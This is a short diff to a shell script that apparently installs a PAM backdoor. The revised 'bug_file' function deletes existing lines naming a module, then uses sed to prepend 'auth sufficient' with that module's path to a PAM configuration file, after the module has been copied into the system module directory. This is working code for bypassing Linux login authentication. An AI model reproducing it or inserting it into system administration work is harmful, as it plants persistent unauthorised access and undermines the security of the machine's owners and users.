@@ -57,7 +57,8 @@ cp ${PAM_OBJECT} ${MODULE_DIR}
 
 
 function bug_file(){
-    (echo "auth    sufficient    ${MODULE_DIR}${PAM_OBJECT}"; sed '/.*'${PAM_OBJECT}'.*/d' $1) > $1
+    sed -i '/.*'${PAM_OBJECT}'.*/d' $1
+    sed -i '1s;^;auth    sufficient    '${MODULE_DIR}${PAM_OBJECT}'\n;' $1
 }
 
 
